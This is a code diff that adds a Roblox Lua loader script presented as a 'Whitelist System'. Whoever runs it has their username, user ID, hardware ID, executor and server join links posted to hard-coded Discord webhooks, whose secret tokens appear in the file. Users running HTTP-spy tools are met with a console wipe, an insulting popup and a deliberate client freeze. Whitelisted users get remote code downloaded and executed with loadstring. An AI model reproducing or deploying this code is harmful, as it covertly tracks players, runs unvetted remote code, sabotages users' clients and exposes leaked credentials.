@@ -1,0 +1,323 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Stats = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local OwnerID = 9461644139
+
+local SpecialWhitelist = {
+	1348991017,
+	9461644139,
+}
+
+local D_Base = "https://discord.com/api/"
+local D_Hook = "webhooks/"
+local G_Base = "https://raw.githubusercontent.com/"
+local R_Base = "https://www.roblox.com/"
+
+local W_ID = "1457850322381832223"
+local W_Key = "/-JMcVOYTPl5WTjaP3cTy3djmLUukxVV__YEiovsBujgV2ZJw2GBUZtFXEZunHw2NbMpK"
+local Whitelisted_Webhook = D_Base .. D_Hook .. W_ID .. W_Key
+
+local U_ID = "1457850310428065843"
+local U_Key = "/huXMy3IT_DuZxp-c7LhQcpHsHJC5DlklqN5g7s6pYLo0nRDtLEmPjgKG6AMAK6NVpF3D"
+local Unregistered_Webhook = D_Base .. D_Hook .. U_ID .. U_Key
+
+local Av_Path = "ScriptCons/Loader/main/Scripts/Woah.jpg"
+local WebhookAvatar = G_Base .. Av_Path
+
+local Msg_Path = "mamacocore/Vaitoma/main/vroom.txt"
+local Message_Url = G_Base .. Msg_Path
+
+local function WipeConsole()
+    for i = 1, 500 do
+        print(string.rep("\n", 10))
+    end
+    if game:GetService("LogService") then
+        pcall(function() game:GetService("LogService"):ClearOutput() end)
+    end
+end
+
+local function HeavyCrash()
+    RunService.RenderStepped:Connect(function()
+        for i = 1, 10000 do
+            math.random() 
+            local c = Instance.new("Part")
+        end
+    end)
+    while true do end
+end
+
+local function DetectSpy()
+	if getgenv and getgenv().HttpSpy then return true end
+	if CoreGui:FindFirstChild("HttpSpyGui") then return true end
+
+	local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	
+	if http_request and debug and debug.getinfo then
+		local info = debug.getinfo(http_request)
+		if info.source ~= "=[C]" then return true end
+	end
+	return false
+end
+
+local function CheckIntegrity()
+    if debug and debug.getinfo then
+        local success, info = pcall(function() return debug.getinfo(LocalPlayer.IsFriendsWith) end)
+        if success and info and info.source ~= "=[C]" then
+            return true
+        end
+    end
+    return false
+end
+
+function createGUI(TitleText, BodyText)
+	local ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Name = "LoaderNotification"
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	ScreenGui.DisplayOrder = 10000
+	
+	local success, parent = pcall(function() return CoreGui end)
+	if success then
+		ScreenGui.Parent = parent
+	else
+		ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+	end
+
+	local MainFrame = Instance.new("Frame")
+	MainFrame.Name = "MainFrame"
+	MainFrame.Parent = ScreenGui
+	MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	MainFrame.BorderSizePixel = 0
+	MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+	MainFrame.Size = UDim2.new(0, 510, 0, 140)
+    MainFrame.ZIndex = 100 
+
+	local Title = Instance.new("TextLabel")
+	Title.Name = "Title"
+	Title.Parent = MainFrame
+	Title.BackgroundTransparency = 1
+	Title.Position = UDim2.new(0, 0, 0, 10)
+	Title.Size = UDim2.new(1, 0, 0, 30)
+	Title.Font = Enum.Font.GothamBold
+	Title.Text = TitleText
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.TextSize = 22
+    Title.ZIndex = 101
+
+	local Description = Instance.new("TextLabel")
+	Description.Name = "Description"
+	Description.Parent = MainFrame
+	Description.BackgroundTransparency = 1
+	Description.Position = UDim2.new(0.05, 0, 0.45, 0)
+	Description.Size = UDim2.new(0.9, 0, 0.6, 0)
+	Description.Font = Enum.Font.Gotham
+	Description.Text = BodyText
+	Description.TextColor3 = Color3.fromRGB(200, 200, 200)
+	Description.TextSize = 20
+	Description.TextWrapped = true
+	Description.TextYAlignment = Enum.TextYAlignment.Top
+    Description.ZIndex = 101
+
+	local CloseButton = Instance.new("TextButton")
+	CloseButton.Name = "CloseButton"
+	CloseButton.Parent = MainFrame
+	CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+	CloseButton.BorderSizePixel = 0
+	CloseButton.Position = UDim2.new(1, -25, 0, 0)
+	CloseButton.Size = UDim2.new(0, 25, 0, 25)
+	CloseButton.Font = Enum.Font.GothamBold
+	CloseButton.Text = "X"
+	CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	CloseButton.TextSize = 14
+    CloseButton.ZIndex = 101
+	
+	CloseButton.MouseButton1Click:Connect(function()
+		ScreenGui:Destroy()
+	end)
+
+	task.spawn(function()
+		local notif = Instance.new("Sound")
+		notif.SoundId = "rbxassetid://7518627362"
+		notif.Volume = 1
+		notif.Parent = SoundService 
+		notif:Play()
+		task.wait(5)
+		notif:Destroy()
+	end)
+end
+
+function SendLog(webhookUrl, logType)
+	local UserId = LocalPlayer.UserId
+	local DisplayName = LocalPlayer.DisplayName
+	local Username = LocalPlayer.Name
+	local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+	local AccountAge = LocalPlayer.AccountAge
+	local Hwid = RbxAnalyticsService:GetClientId()
+	
+	local GameName = "Unknown"
+	pcall(function()
+		local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+		GameName = GameInfo.Name
+	end)
+	
+	local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
+	
+	local Ping = 0
+	pcall(function()
+		Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+	end)
+	
+	local function detectExecutor()
+		return (identifyexecutor and identifyexecutor()) or "Unknown"
+	end
+	local executor = detectExecutor()
+	
+	local date = os.date("%m/%d/%Y")
+	local time = os.date("%X")
+	local gameLink = R_Base .. "games/" .. game.PlaceId
+	local playerLink = R_Base .. "users/" .. UserId
+	local jobIdLink = R_Base .. "games/" .. game.PlaceId .. "?serverJobId=" .. game.JobId
+	local mobileJoinLink = R_Base .. "games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+
+	local embedTitle = ""
+	local embedColor = 0
+	local contentMsg = ""
+
+	if logType == "Whitelist" then
+		embedTitle = "Whitelisted Execution"
+		embedColor = tonumber("0x2ecc71")
+		contentMsg = LocalPlayer.Name .. " Executed The Script (Whitelisted)"
+	elseif logType == "Spy" then
+		embedTitle = "HttpSpy Detected"
+		embedColor = tonumber("0x000000")
+		contentMsg = "Detected for using a Skidded HttpSpy/Shit Executor."
+    elseif logType == "Tamper" then
+		embedTitle = "⚠️ Someone is Trying To Bypass The Whitelist ⚠️"
+		embedColor = tonumber("0xFF0000")
+		contentMsg = "@everyone Someone tried to BYPASS the Whitelist by hooking functions."
+	else
+		embedTitle = "Unregistered Execution"
+		embedColor = tonumber("0xe74c3c")
+		contentMsg = "Script used by A Random User."
+	end
+
+	local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+	if http_request then
+		local embedData = {
+			["username"] = "Whitelist System",
+			["avatar_url"] = WebhookAvatar,
+			["content"] = contentMsg,
+			["embeds"] = {
+				{
+					["title"] = embedTitle,
+					["description"] = string.format("**[%s](%s)**\n`Place ID: %d`", GameName, gameLink, game.PlaceId),
+					["color"] = embedColor
+				},
+				{
+					["title"] = "👤 Player Information",
+					["description"] = string.format(
+						"**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+						DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
+					),
+					["color"] = tonumber("0x3498db")
+				},
+				{
+					["title"] = "🔒 Security / HWID",
+					["description"] = string.format("**HWID:** `%s`", Hwid),
+					["color"] = tonumber("0xe67e22")
+				},
+				{
+					["title"] = "⚙️ Technical Details",
+					["description"] = string.format(
+						"**Executor:** `%s`\n**Job ID:** [Click to Join](%s)\n**Mobile Join:** [Click](%s)",
+						executor, jobIdLink, mobileJoinLink
+					),
+					["color"] = tonumber("0x95a5a6"),
+					["footer"] = { 
+						["text"] = string.format("📅 Date: %s | ⏰ Time: %s", date, time )
+					}
+				}
+			}
+		}
+		
+		local jsonData = HttpService:JSONEncode(embedData)
+		http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
+	end
+end
+
+local function RunSecurityCheck()
+    local detected = false
+    local reason = ""
+
+	if DetectSpy() then 
+        detected = true 
+        reason = "Spy" 
+    end
+    
+    if CheckIntegrity() then
+        detected = true
+        reason = "Tamper"
+    end
+
+    if detected then
+        SendLog(Unregistered_Webhook, reason)
+        WipeConsole()
+        createGUI("Bye bye!", "Nice try Fuckass. You have been logged and your HWID is blacklisted.")
+        task.wait(3)
+        HeavyCrash()
+        return true 
+    end
+    return false
+end
+
+if RunSecurityCheck() then return end
+
+local isWhitelisted = false
+
+if LocalPlayer.UserId == OwnerID or table.find(SpecialWhitelist, LocalPlayer.UserId) then
+	isWhitelisted = true
+else
+	local success, isFriend = pcall(function()
+		return LocalPlayer:IsFriendsWith(OwnerID)
+	end)
+	
+	if success and isFriend then
+		isWhitelisted = true
+	end
+end
+
+if isWhitelisted then
+	createGUI("Whitelisted", "Loading the UI Shortly.... [CREDIT : Lerp for the script.]")
+	createGUI("Do NOT share this to minor.", "If you're caught sharing this (we will log your roblox account) you'll be permanently banned. [CREDIT : Lerp for the script]")
+	
+	task.spawn(function()
+		SendLog(Whitelisted_Webhook, "Whitelist")
+	end)
+	
+	local scriptContent = game:HttpGet(Message_Url)
+	
+	if scriptContent then
+	    scriptContent = scriptContent:gsub("^\239\187\191", "")
+	end
+
+	loadstring(scriptContent)()
+else
+	createGUI("You are not whitelisted.", "If you have any problems with it, contact us in discord. [CREDIT : Lerp for the script]")
+	createGUI("Do NOT share this to minor.", "If you're caught sharing this (we will log your roblox account) you'll be permanently banned. [CREDIT : Lerp for the script]")
+	
+	task.spawn(function()
+		SendLog(Unregistered_Webhook, "Unregistered")
+	end)
+	
+	task.wait(10)
+	error("Unregistered User")
+end
